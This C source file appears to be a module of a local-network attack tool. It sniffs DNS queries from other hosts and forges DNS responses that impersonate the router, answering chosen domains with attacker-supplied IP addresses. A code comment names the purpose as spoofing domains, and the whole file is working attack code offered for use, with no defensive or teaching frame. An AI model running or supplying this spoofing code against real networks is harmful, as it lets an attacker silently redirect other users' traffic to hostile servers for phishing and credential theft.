#include "dns.h"
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include "../client.h"

void AnalyzeDns(struct iovec *packet, char **argv)
{
    struct ether_header *ether;
    struct iphdr        *ip;
    struct udphdr       *udp;
    struct dnshdr       *dns;
    struct query        *query;

    ether = (struct ether_header *)packet -> iov_base;
    if ( ntohs(ether -> ether_type) != ETHERTYPE_IP
            || memcmp(ether -> ether_shost, src_mac, 6) == 0 
            || memcmp(ether -> ether_shost,
                "\x00\x00\x00\x00\x00\x00", 6) == 0)
        return;
    ip = (struct iphdr *)((unsigned char
                *)packet->iov_base+sizeof(*ether));
    if ( ip -> protocol != IPPROTO_UDP )
        return;
    udp = (struct udphdr *)((unsigned char *)ip+sizeof(*ip));

    if ( ntohs(udp -> dest) != 53 || ntohs(udp -> len) < 19 )
        return;
    dns = (struct dnshdr *)((unsigned char *)udp+sizeof(*udp));
    if ( ntohs(dns -> q_count) != 1 || dns -> ans_count != 0 )
        return;
    query = (struct query *)((unsigned char *)dns+sizeof(*dns));
    //define size
    packet -> iov_len = sizeof(*ether) + sizeof(*ip) + sizeof(*udp)
        + sizeof(*dns) + sizeof(struct question) + strlen((char *)&query ->
                name)+1;
    printf("domainn name request: %s\n", (unsigned char *)&query -> name);
    printf("query size: %ld\n", sizeof(struct question)+strlen((char
                *)&query -> name)+1);
    ISlist_send(packet);
}
//use domains in argv like www.google.com example
//argv[0] = "www.google.com"
//argv[1] = "192.168.1.1"
//argv[2] = NULL
void DnsResponse(struct iovec *packet, char **argv)
{
    struct ether_header   *ether;
    struct iphdr          *ip;
    struct udphdr         *udp;
    struct dnshdr         *dns;
    struct query          *query;
    struct res_record     *answer;
    in_addr_t             in_tmp_ip;
    register int          i;

    ISlist_recv(packet);
    if ( argv == NULL )
    {
        fprintf(stderr, "Error calling construct dns response without"
                "domains in arguments\n"
                "use domains in argv like google example\n"
		            "argv[0] = \"google\"\n"
	  	          "argv[1] = \"192.168.1.1\"\n"
		            "argv[2] = NULL\n");
        packet -> iov_len = 0;
        return;
    }
    query = (struct query *)((unsigned char *)packet ->
            iov_base+sizeof(*ether)+sizeof(*ip)+sizeof(*udp)+sizeof(*dns));

    //check if we are intrested to spoof this domain
    for ( i = 0; argv[i] != NULL; i++ )
    {
       if (  strstr((char *)&query -> name, argv[i]) != NULL )
       {
           in_tmp_ip = inet_addr(argv[i+1]);
           break;
       }
    }
    if ( argv[i] == NULL )
    {
        packet -> iov_len = 0;
        return;
    }
    
    //ethernet
    ether = (struct ether_header *)packet->iov_base;
    memcpy(ether -> ether_dhost, ether -> ether_shost, 6);
    memcpy(ether -> ether_shost, src_mac, 6);
    //ip
    ip = (struct iphdr *)((unsigned char *)packet->iov_base+sizeof(*ether));
    //ip -> tot_len = 0; //soon
    ip -> daddr = ip -> saddr;
    memcpy((char *)&ip -> saddr, router_ip, 4);
    ip -> check = 0;
    //udp
    udp = (struct udphdr
            *)((unsigned char *)packet->iov_base+sizeof(*ether)+sizeof(*ip));
    udp -> dest = udp -> source; //udp port
    udp -> source = htons(53);
    udp -> check = 0; //soon
    //dns 
    dns = (struct dnshdr *)((unsigned char *)udp+sizeof(*udp));
    dns -> ans_count = htons(1);
    dns -> flags = htons(0x8500);//htons(0x8180);
    //res_record answer 
    answer = (struct res_record *)((unsigned char
                *)query+sizeof(struct question) + strlen((char
                        *)&query ->name)+1);
    //memcpy(answer -> name, argv[i],
    //        (strlen(argv[i])<256)?strlen(argv[i]):256);
    answer -> name = htons(0xc00c);
    answer -> resources.type = htons(1); 
    answer -> resources._class = htons(1);
    answer -> resources.ttl = htonl(0x00000024);
    answer -> resources.data_len = htons(4);
    memcpy((char *)&answer -> rdata, (char *)&in_tmp_ip, 4);
    udp -> len = htons(sizeof(*udp)+sizeof(*dns)+sizeof(struct
                question)+strlen((char *)&query ->
                    name)+1+sizeof(*answer));
    ip -> tot_len = htons(sizeof(*ip)+ntohs(udp->len));
    ip -> check = compute_checksum(ip, sizeof(*ip)); 
    udp->check = compute_udp_checksum(ip, udp);
    packet -> iov_len = (ntohs(ip -> tot_len)+sizeof(*ether));
}

